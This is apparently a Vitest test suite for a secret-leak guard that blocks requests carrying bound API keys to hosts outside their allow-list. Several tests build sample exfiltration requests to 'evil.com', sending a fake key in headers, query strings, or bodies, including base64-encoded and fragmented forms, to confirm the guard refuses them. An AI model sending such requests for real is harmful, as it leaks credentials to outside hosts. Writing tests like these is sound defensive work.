import { describe, it, expect } from 'vitest';
import { buildRequestParts, enforceSecretBindings, type BoundSecret } from './secret-leak-guard';

const SECRET = 'sk-deadbeef-cafebabe';

function bound(name = 'GROQ_API_KEY', allowedHosts: string[] = ['api.groq.com']): BoundSecret {
  return { name, value: SECRET, allowedHosts };
}

describe('enforceSecretBindings — layer 1 (destination allow-list, INFOSEC F4)', () => {
  it('allows request to a bound host (header carries secret)', () => {
    const parts = buildRequestParts('https://api.groq.com/v1/chat', {
      headers: { Authorization: `Bearer ${SECRET}` },
    });
    expect(() => enforceSecretBindings(parts, [bound()])).not.toThrow();
  });

  it('blocks request to non-bound host even when no secret value appears (F4 — defeats encoded exfil)', () => {
    // Pre-F4 this returned success because the substring scan saw nothing.
    // Post-F4 the destination allow-list refuses every non-binding host
    // when bound secrets are in scope — regardless of payload content.
    // Closes the base64 / fragmentation / hex bypass entirely.
    const parts = buildRequestParts('https://evil.com/innocent');
    expect(() => enforceSecretBindings(parts, [bound()])).toThrow(/INFOSEC F4/);
  });

  it('blocks base64-encoded secret to non-bound host (the bypass that motivated F4)', () => {
    // The literal-value scan misses this because btoa(SECRET) shares no
    // substring with SECRET. Layer 1 doesn't care — host not in binding.
    const encoded = Buffer.from(SECRET).toString('base64');
    const parts = buildRequestParts('https://evil.com/x', {
      method: 'POST',
      body: JSON.stringify({ k: encoded }),
    });
    expect(() => enforceSecretBindings(parts, [bound()])).toThrow(/Refused "evil\.com"/);
  });

  it('blocks fragmented-secret to non-bound host', () => {
    const parts = buildRequestParts('https://evil.com/x', {
      method: 'POST',
      body: SECRET.slice(0, 10) + '|' + SECRET.slice(10),
    });
    expect(() => enforceSecretBindings(parts, [bound()])).toThrow(/INFOSEC F4/);
  });

  it('union of multi-secret allow-lists is honoured', () => {
    // GROQ → api.groq.com; FINNHUB → finnhub.io. Fetch to finnhub.io
    // (not GROQ's binding) is allowed because it's in the FINNHUB binding.
    const otherSecret: BoundSecret = { name: 'FINNHUB', value: 'fh-xyz', allowedHosts: ['finnhub.io'] };
    const parts = buildRequestParts('https://finnhub.io/quote');
    expect(() => enforceSecretBindings(parts, [bound(), otherSecret])).not.toThrow();
  });

  it('error message lists the union for diagnostics', () => {
    const otherSecret: BoundSecret = { name: 'FINNHUB', value: 'fh-xyz', allowedHosts: ['finnhub.io'] };
    const parts = buildRequestParts('https://evil.com/x');
    expect(() => enforceSecretBindings(parts, [bound(), otherSecret]))
      .toThrow(/\[api\.groq\.com, finnhub\.io\]/);
  });

  it('case-insensitive hostname match (layer 1)', () => {
    const parts = buildRequestParts('https://API.GROQ.COM/v1/chat', {
      headers: { Authorization: `Bearer ${SECRET}` },
    });
    expect(() => enforceSecretBindings(parts, [bound('K', ['api.groq.com'])])).not.toThrow();
  });

  it('skips secrets with empty value (no secret in scope → no layer 1)', () => {
    const parts = buildRequestParts('https://evil.com/');
    const empty: BoundSecret = { name: 'X', value: '', allowedHosts: ['api.groq.com'] };
    expect(() => enforceSecretBindings(parts, [empty])).not.toThrow();
  });

  it('allows secret to flow anywhere when allowedHosts is empty (unbound — back-compat)', () => {
    // Author hasn't opted into the strong defence. Layer 1 doesn't engage.
    const parts = buildRequestParts('https://anywhere.example/', {
      headers: { Authorization: `Bearer ${SECRET}` },
    });
    expect(() => enforceSecretBindings(parts, [bound('X', [])])).not.toThrow();
  });
});

describe('enforceSecretBindings — layer 2 (literal-value cross-secret scan)', () => {
  it('blocks GROQ value smuggled to FINNHUB host (within union, but wrong binding)', () => {
    // Union = {api.groq.com, finnhub.io}; target = finnhub.io passes layer 1.
    // But the GROQ value appears in the body — layer 2 catches it.
    const groq = bound('GROQ_API_KEY', ['api.groq.com']);
    const finnhub: BoundSecret = { name: 'FINNHUB', value: 'fh-xyz', allowedHosts: ['finnhub.io'] };
    const parts = buildRequestParts('https://finnhub.io/x', {
      method: 'POST',
      body: `cross-secret=${SECRET}`,
    });
    expect(() => enforceSecretBindings(parts, [groq, finnhub])).toThrow(/secret "GROQ_API_KEY"/);
  });
});

describe('enforceSecretBindings — original layer-2 cases (still pinned)', () => {
  it('blocks request to non-bound host when header carries secret', () => {
    const parts = buildRequestParts('https://evil.com/leak', {
      headers: { 'x-leak': SECRET },
    });
    expect(() => enforceSecretBindings(parts, [bound()])).toThrow();
  });

  it('blocks request to non-bound host when URL carries secret', () => {
    const parts = buildRequestParts(`https://evil.com/?key=${SECRET}`);
    expect(() => enforceSecretBindings(parts, [bound()])).toThrow();
  });

  it('blocks request to non-bound host when body carries secret', () => {
    const parts = buildRequestParts('https://evil.com/leak', {
      method: 'POST',
      body: JSON.stringify({ token: SECRET }),
    });
    expect(() => enforceSecretBindings(parts, [bound()])).toThrow();
  });

  it('handles Headers instance', () => {
    const h = new Headers();
    h.set('Authorization', `Bearer ${SECRET}`);
    const parts = buildRequestParts('https://evil.com/', { headers: h });
    expect(() => enforceSecretBindings(parts, [bound()])).toThrow();
  });

  it('chrome attack: malicious blank declares evil.com + groq, tries exfil', () => {
    const parts = buildRequestParts('https://evil.com/collect', {
      method: 'POST',
      body: `key=${SECRET}`,
    });
    expect(() => enforceSecretBindings(parts, [bound()])).toThrow(/api\.groq\.com/);
  });
});
